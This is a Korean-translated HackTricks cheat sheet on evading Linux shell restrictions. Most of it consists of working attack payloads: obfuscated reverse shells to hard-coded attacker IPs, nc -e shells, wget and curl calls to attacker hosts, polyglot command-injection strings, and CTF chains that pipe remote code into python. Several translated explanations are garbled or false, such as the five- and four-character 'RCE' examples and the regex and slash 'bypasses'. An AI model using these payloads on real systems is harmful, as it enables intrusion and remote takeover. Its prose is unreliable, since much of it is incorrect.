# Linux 제한 우회

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 일반적인 제한 우회

### 리버스 쉘
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 짧은 리버스 쉘

리버스 쉘은 원격 시스템에 접근하기 위해 사용되는 기술입니다. 일반적으로 명령어 쉘을 통해 원격 시스템에 명령을 전달하고 결과를 받아올 수 있습니다. 이를 통해 시스템을 제어하거나 정보를 수집할 수 있습니다.

리버스 쉘을 사용하는 가장 간단한 방법은 `nc` 명령어를 사용하는 것입니다. 다음은 리버스 쉘을 생성하는 명령어입니다.

```bash
nc -e /bin/sh <attacker_ip> <port>
```

위 명령어에서 `<attacker_ip>`는 공격자의 IP 주소를, `<port>`는 공격자가 수신 대기할 포트 번호를 나타냅니다. 이 명령어를 실행하면 공격자는 원격 시스템에 접근할 수 있게 됩니다.

리버스 쉘을 사용할 때는 주의해야 할 점이 있습니다. 공격자와 원격 시스템 사이의 통신은 암호화되지 않으므로, 중간에 누군가가 통신을 가로채거나 조작할 수 있습니다. 따라서 리버스 쉘을 사용할 때는 보안을 강화하기 위해 추가적인 조치를 취해야 합니다.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### 경로 우회 및 금지된 단어 우회

In some cases, when performing a penetration test or trying to exploit a system, you may encounter restrictions on certain paths or forbidden words that prevent you from executing certain commands or accessing specific files. In such situations, it is necessary to find alternative paths or bypass the restrictions to achieve your objectives.

#### Bypassing Restricted Paths

To bypass restricted paths, you can try the following techniques:

1. **Relative Paths**: Instead of using absolute paths, try using relative paths to access files or directories. For example, if the restricted path is `/home/user/secret/file.txt`, you can try accessing it using `../secret/file.txt`.

2. **Symbolic Links**: Symbolic links can be used to create shortcuts to files or directories. By creating a symbolic link to a restricted file or directory in a non-restricted location, you can access it through the symbolic link. For example, you can create a symbolic link using the `ln -s` command: `ln -s /restricted/file.txt /non-restricted/link.txt`.

3. **Environment Variables**: Environment variables can be used to define custom paths that can bypass restrictions. By setting an environment variable to a non-restricted path, you can access files or directories through that variable. For example, you can set an environment variable using the `export` command: `export MY_PATH=/non-restricted/`.

#### Bypassing Forbidden Words

To bypass forbidden words, you can try the following techniques:

1. **Alternative Commands**: Instead of using the forbidden command directly, try using alternative commands that achieve the same result. For example, if the command `rm` is forbidden, you can try using `unlink` or `del`.

2. **Command Substitution**: Command substitution allows you to execute a command within another command. By using command substitution, you can bypass forbidden words by indirectly executing the forbidden command. For example, you can use command substitution with the `echo` command: `$(echo forbidden_command)`.

3. **Character Substitution**: Character substitution involves replacing forbidden characters with similar characters that are allowed. For example, if the word `password` is forbidden, you can try using `p@ssw0rd` or `p4ssw0rd`.

Remember, when bypassing restrictions, it is important to exercise caution and ensure that your actions are legal and authorized.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 금지된 공백 우회하기

In some cases, when executing commands in a restricted environment, the use of spaces is forbidden. However, there are alternative ways to bypass this restriction and execute commands that contain spaces.

일부 경우에는 제한된 환경에서 명령을 실행할 때 공백 사용이 금지될 수 있습니다. 그러나 이 제한을 우회하고 공백을 포함하는 명령을 실행하는 대체 방법이 있습니다.

One method is to use the backslash character `\` before the space. This tells the shell to treat the space as a literal character and not as a delimiter.

하나의 방법은 공백 앞에 백슬래시 문자 `\`를 사용하는 것입니다. 이렇게 하면 쉘이 공백을 구분자가 아닌 리터럴 문자로 처리하도록 지시합니다.

For example, instead of typing `ls -l`, you would type `ls\ -l`.

예를 들어, `ls -l`을 입력하는 대신 `ls\ -l`을 입력합니다.

Another method is to enclose the command containing spaces within single quotes `'`. This prevents the shell from interpreting the spaces as delimiters.

다른 방법은 공백을 포함하는 명령을 작은따옴표 `'`로 둘러싸는 것입니다. 이렇게 하면 쉘이 공백을 구분자로 해석하지 않습니다.

For example, instead of typing `ls -l`, you would type `'ls -l'`.

예를 들어, `ls -l`을 입력하는 대신 `'ls -l'`을 입력합니다.

By using these techniques, you can bypass the restriction on using spaces and execute commands successfully in a restricted environment.

이러한 기술을 사용하여 공백 사용 제한을 우회하고 제한된 환경에서 명령을 성공적으로 실행할 수 있습니다.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### 백슬래시와 슬래시 우회하기

Sometimes, when attempting to execute commands in a restricted environment, the use of backslashes or slashes may be blocked. However, there are alternative methods to bypass these restrictions.

#### Bypassing Backslashes

To bypass the restriction on backslashes, you can use the following techniques:

1. Use double quotes: By enclosing the command within double quotes, backslashes will be treated as literal characters and not as escape characters. For example:

   ```
   $ echo "This is a backslash: \\"
   ```

2. Use the `printf` command: The `printf` command can be used to print the backslash character. For example:

   ```
   $ printf "\\"
   ```

#### Bypassing Slashes

To bypass the restriction on slashes, you can use the following techniques:

1. Use alternative separators: Instead of using slashes, you can use alternative separators such as colons or semicolons. For example:

   ```
   $ echo "This is a slash: /"
   $ echo "This is a colon: :"
   $ echo "This is a semicolon: ;"
   ```

2. Use the `printf` command: Similar to bypassing backslashes, you can use the `printf` command to print the slash character. For example:

   ```
   $ printf "/"
   ```

By employing these techniques, you can bypass the restrictions on backslashes and slashes, allowing you to execute commands in a restricted environment.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 파이프 우회

Pipes는 리눅스 명령어에서 매우 유용한 기능입니다. 그러나 일부 제한된 환경에서는 파이프를 사용할 수 없을 수 있습니다. 이러한 경우에는 다른 방법을 사용하여 파이프를 우회해야 합니다.

#### 1. Process Substitution 사용하기

Process Substitution은 파이프를 사용하지 않고도 명령어의 출력을 다른 명령어로 전달하는 방법입니다. 다음은 Process Substitution을 사용하여 파이프를 우회하는 예시입니다.

```bash
command1 <(command2)
```

위의 예시에서 `command2`의 출력은 파일처럼 취급되어 `command1`에 전달됩니다.

#### 2. Temporary File 사용하기

파이프를 우회하는 또 다른 방법은 임시 파일을 사용하는 것입니다. 다음은 임시 파일을 사용하여 파이프를 우회하는 예시입니다.

```bash
command1 > temp_file && command2 < temp_file && rm temp_file
```

위의 예시에서 `command1`의 출력은 `temp_file`에 저장되고, `command2`는 `temp_file`을 입력으로 받습니다. 마지막으로 `temp_file`을 삭제합니다.

#### 3. Command Substitution 사용하기

Command Substitution은 명령어의 출력을 변수에 할당하는 방법입니다. 이를 사용하여 파이프를 우회할 수 있습니다. 다음은 Command Substitution을 사용하여 파이프를 우회하는 예시입니다.

```bash
variable=$(command1); command2 <<< "$variable"
```

위의 예시에서 `command1`의 출력은 `variable`에 할당되고, `command2`는 `variable`을 입력으로 받습니다.

#### 4. Named Pipes 사용하기

Named Pipes는 파일처럼 취급되지만 실제로는 프로세스 간 통신을 위한 파이프입니다. 다음은 Named Pipes를 사용하여 파이프를 우회하는 예시입니다.

```bash
mkfifo mypipe
command1 < mypipe & command2 > mypipe
```

위의 예시에서 `command1`은 `mypipe`로부터 입력을 받고, `command2`는 `mypipe`로 출력을 전달합니다.

이러한 방법들을 사용하여 파이프를 우회할 수 있으며, 제한된 환경에서도 명령어 간 데이터 전달을 수행할 수 있습니다.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 16진수 인코딩을 사용하여 우회하기

Bash 제한을 우회하기 위해 16진수 인코딩을 사용할 수 있습니다. 이를 통해 특수 문자를 우회하고 원하는 명령을 실행할 수 있습니다.

다음은 16진수 인코딩을 사용하여 Bash 제한을 우회하는 방법입니다.

1. 우회하려는 명령을 16진수로 인코딩합니다. 예를 들어, `ls -la` 명령을 인코딩하면 `6c73202d6c61`가 됩니다.

2. 인코딩된 명령을 `$'\x'`와 함께 사용하여 실행합니다. 예를 들어, `echo -e $'\x6c\x73\x20\x2d\x6c\x61'` 명령을 실행하면 `ls -la`와 동일한 결과를 얻을 수 있습니다.

이렇게 하면 Bash 제한을 우회하여 원하는 명령을 실행할 수 있습니다. 그러나 이 방법은 명령을 인코딩해야 하므로 번거로울 수 있습니다.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### IP 우회

Sometimes during a penetration test, you may encounter restrictions that block your IP address. In such cases, you can try bypassing these restrictions using various techniques. Here are a few methods you can use:

#### 1. Proxy Servers

Using proxy servers is a common way to bypass IP restrictions. By routing your traffic through a proxy server, you can hide your original IP address and appear as if you are accessing the target from a different location. There are both free and paid proxy servers available that you can use for this purpose.

#### 2. VPN (Virtual Private Network)

A VPN is another effective method to bypass IP restrictions. By connecting to a VPN server, your traffic is encrypted and routed through the server, making it appear as if you are accessing the target from the VPN server's location. VPNs are widely used for privacy and security purposes, and there are many VPN service providers available.

#### 3. Tor Network

The Tor network is a decentralized network that allows users to browse the internet anonymously. By using the Tor browser, your traffic is routed through multiple volunteer-operated servers, making it difficult to trace back to your original IP address. However, it is important to note that the Tor network may introduce additional latency and may not be suitable for all types of activities.

#### 4. Mobile Hotspots

If you have access to a mobile device with internet connectivity, you can use it as a mobile hotspot to bypass IP restrictions. By connecting your computer to the mobile hotspot, you can use the mobile device's IP address to access the target. This method can be useful when other options are not available.

These are just a few methods to bypass IP restrictions. It is important to note that bypassing IP restrictions may be against the terms of service of certain platforms or websites, so always ensure that you have proper authorization before attempting any bypassing techniques.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 시간 기반 데이터 유출

Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system by manipulating the timing of certain actions. This technique is particularly useful when traditional methods of data exfiltration, such as network-based or file-based exfiltration, are blocked or monitored.

시간 기반 데이터 유출은 해커들이 특정 동작의 타이밍을 조작하여 대상 시스템에서 민감한 정보를 추출하는 기술입니다. 이 기술은 네트워크 기반 또는 파일 기반 데이터 유출과 같은 전통적인 방법이 차단되거나 모니터링되는 경우에 특히 유용합니다.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 환경 변수에서 문자 가져오기

You can use the `echo` command along with the dollar sign `$` to retrieve characters from environment variables. 

환경 변수에서 문자를 가져오기 위해 `echo` 명령어와 달러 기호 `$`를 사용할 수 있습니다.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS 데이터 유출

예를 들어 **burpcollab** 또는 [**pingb**](http://pingb.in)를 사용할 수 있습니다.

### 내장 함수

외부 함수를 실행할 수 없고 **제한된 내장 함수만 사용하여 RCE를 얻을 수 있는 경우**, 이를 우회하기 위한 몇 가지 편리한 트릭이 있습니다. 일반적으로 **모든 내장 함수를 사용할 수 없을 것**이므로 모든 옵션을 알고 우회를 시도해야 합니다. [**devploit**](https://twitter.com/devploit)에서 아이디어를 얻었습니다.\
먼저 모든 [**쉘 내장 함수**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**를 확인하세요**. 그런 다음 다음은 몇 가지 **권장 사항**입니다:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### 다중언어 명령어 삽입

Polyglot command injection은 여러 언어에서 동작하는 명령어 삽입 기법입니다. 이 기법은 웹 애플리케이션에서 사용자 입력을 처리하는 과정에서 발생하는 취약점을 이용합니다. 공격자는 사용자 입력을 통해 악의적인 명령어를 삽입하여 시스템에 대한 제어를 획득할 수 있습니다.

이 기법은 여러 언어에서 동작하는 명령어를 사용하여 공격을 수행하기 때문에, 웹 애플리케이션이 어떤 언어로 작성되었든지 상관없이 적용할 수 있습니다. 예를 들어, PHP, Python, Ruby, Perl 등 다양한 언어에서 사용할 수 있는 명령어를 조합하여 공격을 수행할 수 있습니다.

Polyglot command injection은 웹 애플리케이션의 보안을 강화하기 위해 주의해야 할 취약점 중 하나입니다. 개발자는 사용자 입력을 적절히 필터링하고, 명령어 삽입 공격에 대비하여 적절한 보안 대책을 마련해야 합니다.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 정규식 우회하기

정규식은 텍스트 패턴을 매칭시키기 위해 사용되는 강력한 도구입니다. 그러나 때로는 정규식 패턴에 의해 제한되는 상황이 발생할 수 있습니다. 이러한 제한을 우회하기 위해 몇 가지 기법을 사용할 수 있습니다.

1. **문자 클래스 우회**: 정규식 패턴에서 특정 문자 클래스에 대한 제한을 우회하기 위해 해당 문자 클래스에 속하지 않는 문자를 사용할 수 있습니다. 예를 들어, `[a-z]` 문자 클래스에 속하는 문자를 허용하지 않는 패턴이 있다면, `[!a-z]`와 같이 `!`를 사용하여 해당 문자 클래스를 우회할 수 있습니다.

2. **문자열 치환**: 정규식 패턴에 의해 제한되는 문자열을 다른 문자열로 치환하여 우회할 수 있습니다. 예를 들어, `admin`이라는 문자열을 허용하지 않는 패턴이 있다면, `adm1n`과 같이 문자열을 변형하여 우회할 수 있습니다.

3. **전방탐색 및 후방탐색**: 전방탐색(`(?=...)`)과 후방탐색(`(?<=...)`)을 사용하여 정규식 패턴에 의해 제한되는 부분을 우회할 수 있습니다. 이러한 탐색 패턴을 사용하면 특정 패턴 앞 또는 뒤에 있는 부분을 선택할 수 있습니다.

4. **정규식 모드 변경**: 정규식 패턴에 영향을 주는 모드를 변경하여 제한을 우회할 수 있습니다. 예를 들어, `(?i)`를 사용하여 대소문자를 구분하지 않는 모드로 변경할 수 있습니다.

이러한 기법을 사용하여 정규식 패턴에 의해 제한되는 상황을 우회할 수 있습니다. 그러나 이러한 우회 기법은 특정 상황에 따라 작동할 수 있으므로, 신중하게 사용해야 합니다.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator는 Bash 스크립트를 난독화하는 도구입니다. 이 도구를 사용하면 스크립트를 읽기 어렵게 만들어서 스크립트의 내용을 보호할 수 있습니다. Bashfuscator는 다양한 난독화 기술을 사용하여 스크립트를 변환합니다. 이러한 변환은 스크립트를 실행하는 데는 영향을 주지 않지만, 스크립트를 분석하거나 수정하는 것을 어렵게 만듭니다.

Bashfuscator를 사용하려면 다음 명령을 실행하십시오:

```bash
bashfuscator script.sh
```

이 명령은 `script.sh`라는 스크립트를 난독화합니다. 난독화된 스크립트는 `script_obfuscated.sh`라는 파일로 저장됩니다. 이 파일은 원본 스크립트와 동일한 기능을 수행하지만, 읽기 어렵게 변환되어 있습니다.

Bashfuscator는 다양한 난독화 옵션을 제공합니다. 이러한 옵션을 사용하여 난독화 수준을 조정할 수 있습니다. 예를 들어, `-l` 옵션을 사용하여 난독화 수준을 낮출 수 있습니다. 또한, `-o` 옵션을 사용하여 난독화된 스크립트의 출력 파일 이름을 지정할 수 있습니다.

Bashfuscator는 스크립트의 난독화만을 목적으로 하며, 보안을 완전히 보장하지는 않습니다. 따라서, 민감한 정보를 포함하는 스크립트를 보호해야 할 경우에는 추가적인 보안 조치를 취해야 합니다.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 5 글자로 RCE 실행하기

```bash
$ echo ${PATH//:/\n}
```

위 명령어는 5 글자로 RCE(Remote Code Execution)를 실행하는 방법입니다.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4글자로 RCE 실행하기

#### 개요

이 기술은 쉘 명령어를 실행하여 원격 코드 실행(RCE)를 수행하는 방법을 설명합니다. 이 기술은 쉘 명령어를 제한하는 환경에서 유용하게 사용될 수 있습니다.

#### 과정

1. 쉘 명령어를 실행할 수 있는 취약한 프로그램을 찾습니다.
2. 취약한 프로그램에 입력할 수 있는 문자열을 준비합니다.
3. 입력할 문자열을 작성할 때, 쉘 명령어를 실행하기 위해 필요한 최소한의 문자를 사용합니다. 이를 위해 4글자로 구성된 쉘 명령어를 작성합니다.
4. 작성한 쉘 명령어를 입력하여 RCE를 실행합니다.

#### 예시

다음은 4글자로 RCE를 실행하는 예시입니다.

```bash
$ echo $0
bash
$ echo $$
12345
$ echo $0|cut -c1-4>/tmp/.$$
$ cat /tmp/.$$
bash
```

위 예시에서는 `echo $0` 명령어를 사용하여 현재 쉘의 종류를 확인합니다. 그리고 `echo $$` 명령어를 사용하여 현재 쉘의 프로세스 ID를 확인합니다. 그 다음, `echo $0|cut -c1-4>/tmp/.$$` 명령어를 사용하여 현재 쉘의 종류를 4글자로 자르고 `/tmp/.$$` 파일에 저장합니다. 마지막으로 `cat /tmp/.$$` 명령어를 사용하여 `/tmp/.$$` 파일의 내용을 출력합니다.

이 예시에서는 4글자로 RCE를 실행하기 위해 `bash`라는 쉘 명령어를 사용하였습니다. 이를 통해 쉘 명령어를 제한하는 환경에서도 RCE를 성공적으로 수행할 수 있습니다.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 읽기 전용/Noexec/Distroless 우회

**읽기 전용 및 noexec 보호** 또는 distroless 컨테이너 내부에 있는 경우에도 **임의의 이진 파일을 실행할 수 있는 방법이 있습니다. 심지어 셸을 실행할 수도 있습니다!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot 및 다른 감옥 우회

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 참고 자료 및 더 많은 정보

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 고급인 커뮤니티 도구를 기반으로 한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
